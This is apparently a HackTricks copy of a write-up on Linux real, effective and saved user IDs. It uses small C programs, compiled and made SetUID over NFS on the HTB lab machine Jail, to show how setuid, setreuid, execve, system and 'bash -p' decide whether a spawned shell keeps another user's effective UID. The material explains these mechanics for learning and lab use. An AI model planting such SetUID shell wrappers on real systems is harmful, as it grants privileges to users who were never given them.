# euid, ruid, suid

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

**This post was copied from** [**https://0xdf.gitlab.io/2022/05/31/setuid-rabbithole.html#testing-on-jail**](https://0xdf.gitlab.io/2022/05/31/setuid-rabbithole.html#testing-on-jail)

## **`*uid`**

* **`ruid`**: This is the **real user ID** of the user that started the process.
* **`euid`**: This is the **effective user ID**, is what the system looks to when deciding **what privileges the process should have**. In most cases, the `euid` will be the same as the `ruid`, but a SetUID binary is an example of a case where they differ. When a **SetUID** binary starts, the **`euid` is set to the owner of the file**, which allows these binaries to function.
* `suid`: This is the **saved user ID,** it's used when a privileged process (most cases running as root) needs to **drop privileges** to do some behavior, but needs to then **come back** to the privileged state.

{% hint style="info" %}
If a **non-root process** wants to **change it’s `euid`**, it can only **set** it to the current values of **`ruid`**, **`euid`**, or **`suid`**.
{% endhint %}

## set\*uid

On first look, it’s easy to think that the system calls **`setuid`** would set the `ruid`. In fact, when for a privileged process, it does. But in the general case, it actually **sets the `euid`**. From the [man page](https://man7.org/linux/man-pages/man2/setuid.2.html):

> setuid() **sets the effective user ID of the calling process**. If the calling process is privileged (more precisely: if the process has the CAP\_SETUID capability in its user namespace), the real UID and saved set-user-ID are also set.

So in the case where you’re running `setuid(0)` as root, this is sets all the ids to root, and basically locks them in (because `suid` is 0, it loses the knowledge or any previous user - of course, root processes can change to any user they want).

Two less common syscalls, **`setreuid`** (`re` for real and effective) and **`setresuid`** (`res` includes saved) set the specific ids. Being in an unprivileged process limits these calls (from [man page](https://man7.org/linux/man-pages/man2/setresuid.2.html) for `setresuid`, though the [page](https://man7.org/linux/man-pages/man2/setreuid.2.html) for `setreuid` has similar language):

> An unprivileged process may change its **real UID, effective UID, and saved set-user-ID**, each to one of: the current real UID, the current effective UID, or the current saved set-user-ID.
>
> A privileged process (on Linux, one having the CAP\_SETUID capability) may set its real UID, effective UID, and saved set-user-ID to arbitrary values.

It’s important to remember that these aren’t here as a security feature, but rather reflect the intended workflow. When a program wants to change to another user, it changes the effective userid so it can act as that user.

As an attacker, it’s easy to get in a bad habit of just calling `setuid` because the most common case is to go to root, and in that case, `setuid` is effectively the same as `setresuid`.

## Execution

### **execve (and other execs)**

The `execve` system call executes a program specified in the first argument. The second and third arguments are arrays, the arguments (`argv`) and the environment (`envp`). There are several other system calls that are based on `execve`, referred to as `exec` ([man page](https://man7.org/linux/man-pages/man3/exec.3.html)). They are each just wrappers on top of `execve` to provide different shorthands for calling `execve`.

There’s a ton of detail on the [man page](https://man7.org/linux/man-pages/man2/execve.2.html), for how it works. In short, when **`execve` starts a program**, it uses the **same memory space as the calling program**, replacing that program, and newly initiating the stack, heap, and data segments. It wipes out the code for the program and writes the new program into that space.

So what happens to `ruid`, `euid`, and `suid` on a call to `execve`? It does not change the metadata associated with the process. The man page explicitly states:

> The process’s real UID and real GID, as well as its supplementary group IDs, are **unchanged** by a call to **execve**().

There’s a bit more nuance to the `euid`, with a longer paragraph describing what happens. Still, it’s focused on if the new program has the SetUID bit set. Assuming that isn’t the case, then the `euid` is also unchanged by `execve`.

The `suid` is copied from the `euid` when `execve` is called:

> The effective user ID of the process is copied to the saved set-user-ID; similarly, the effective group ID is copied to the saved set-group-ID. This copying takes place after any effective ID changes that occur because of the set-user-ID and set-group-ID mode bits.

### **system**

`system` is a [completely different approach](https://man7.org/linux/man-pages/man3/system.3.html) to starting a new process. Where `execve` operates at the process level within the same process, **`system` uses `fork` to create a child process** and then executes in that child process using `execl`:

> ```
> execl("/bin/sh", "sh", "-c", command, (char *) NULL);
> ```

`execl` is just a wrapper around `execve` which converts string arguments into the `argv` array and calls `execve`. It’s important to note that **`system` uses `sh` to call the command**.

### sh and bash SUID <a href="#sh-and-bash-suid" id="sh-and-bash-suid"></a>

**`bash`** has a **`-p` option**, which the [man page](https://linux.die.net/man/1/bash) describes as:

> Turn on _privileged_ mode. In this mode, the **$ENV** and **$BASH\_ENV** files are not processed, shell functions are not inherited from the environment, and the **SHELLOPTS**, **BASHOPTS**, **CDPATH**, and **GLOBIGNORE** variables, if they appear in the environment, are ignored. If the shell is started with the effective user (group) id not equal to the real user (group) id, and the **-p option is not supplied**, these actions are taken and the **effective user id is set to the real user id**. If the **-p** option **is supplied** at startup, the **effective user id is not reset**. Turning this option off causes the effective user and group ids to be set to the real user and group ids.

In short, without `-p`, `euid` is set to `ruid` when Bash is run. **`-p` prevents this**.

The **`sh`** shell **doesn’t have a feature like this**. The [man page](https://man7.org/linux/man-pages/man1/sh.1p.html) doesn’t mention “user ID”, other than with the `-i` option, which says:

> \-i Specify that the shell is interactive; see below. An implementation may treat specifying the -i option as an error if the real user ID of the calling process does not equal the effective user ID or if the real group ID does not equal the effective group ID.

## Testing

### setuid / system <a href="#setuid--system" id="setuid--system"></a>

With all of that background, I’ll take this code and walk through what happens on Jail (HTB):

```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setuid(1000);
    system("id");
    return 0;
}
```

This program is compiled and set as SetUID on Jail over NFS:

```bash
oxdf@hacky$ gcc a.c -o /mnt/nfsshare/a;
...[snip]...
oxdf@hacky$ chmod 4755 /mnt/nfsshare/a
```

As root, I can see this file:

```
[root@localhost nfsshare]# ls -l a 
-rwsr-xr-x. 1 frank frank 16736 May 30 04:58 a
```

When I run this as nobody, `id` runs as nobody:

```bash
bash-4.2$ $ ./a
uid=99(nobody) gid=99(nobody) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
```

The program starts with a `ruid` of 99 (nobody) and an `euid` of 1000 (frank). When it reaches the `setuid` call, those same values are set.

Then `system` is called, and I would expect to see `uid` of 99, but also an `euid` of 1000. Why isn’t there one? The issue is that **`sh` is symlinked to `bash`** in this distribution:

```
$ ls -l /bin/sh
lrwxrwxrwx. 1 root root 4 Jun 25  2017 /bin/sh -> bash
```

So `system` calls `/bin/sh sh -c id`, which is effectively `/bin/bash bash -c id`. When `bash` is called, with no `-p`, then it sees `ruid` of 99 and `euid` of 1000, and sets `euid` to 99.

### setreuid / system <a href="#setreuid--system" id="setreuid--system"></a>

To test that theory, I’ll try replacing `setuid` with `setreuid`:

```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setreuid(1000, 1000);
    system("id");
    return 0;
}
```

Compile and permissions:

```
oxdf@hacky$ gcc b.c -o /mnt/nfsshare/b; chmod 4755 /mnt/nfsshare/b
```

Now on Jail, now `id` returns uid of 1000:

```
bash-4.2$ $ ./b
uid=1000(frank) gid=99(nobody) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
```

The `setreuid` call set both `ruid` and `euid` to 1000, so when `system` called `bash`, they matched, and things continued as frank.

### setuid / execve <a href="#setuid--execve" id="setuid--execve"></a>

Calling `execve` If my understanding above is correct, I could also not worry about messing with the uids, and instead call `execve`, as that will carry though the existing IDs. That will work, but there are traps. For example, common code might look like this:

```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setuid(1000);
    execve("/usr/bin/id", NULL, NULL);
    return 0;
}
```

Without the environment (I’m passing NULL for simplicity), I’ll need a full path on `id`. This works, returning what I expect:

```
bash-4.2$ $ ./c
uid=99(nobody) gid=99(nobody) euid=1000(frank) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
```

The `[r]uid` is 99, but the `euid` is 1000.

If I try to get a shell from this, I have to be careful. For example, just calling `bash`:

```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setuid(1000);
    execve("/bin/bash", NULL, NULL);
    return 0;
}
```

I’ll compile that and set it SetUID:

```
oxdf@hacky$ gcc d.c -o /mnt/nfsshare/d
oxdf@hacky$ chmod 4755 /mnt/nfsshare/d
```

Still, this will return all nobody:

```
bash-4.2$ $ ./d
bash-4.2$ $ id
uid=99(nobody) gid=99(nobody) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
```

If it were `setuid(0)`, then it would work fine (assuming the process had permission to do that), as then it changes all three ids to 0. But as a non-root user, this just sets the `euid` to 1000 (which is already was), and then calls `sh`. But `sh` is `bash` on Jail. And when `bash` starts with `ruid` of 99 and `euid` of 1000, it will drop the `euid` back to 99.

To fix this, I’ll call `bash -p`:

```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    char *const paramList[10] = {"/bin/bash", "-p", NULL};
    setuid(1000);
    execve(paramList[0], paramList, NULL);
    return 0;
}
```

This time the `euid` is there:

```
bash-4.2$ $ ./e
bash-4.2$ $ id
uid=99(nobody) gid=99(nobody) euid=1000(frank) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
```

Or I could call `setreuid` or `setresuid` instead of `setuid`.

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
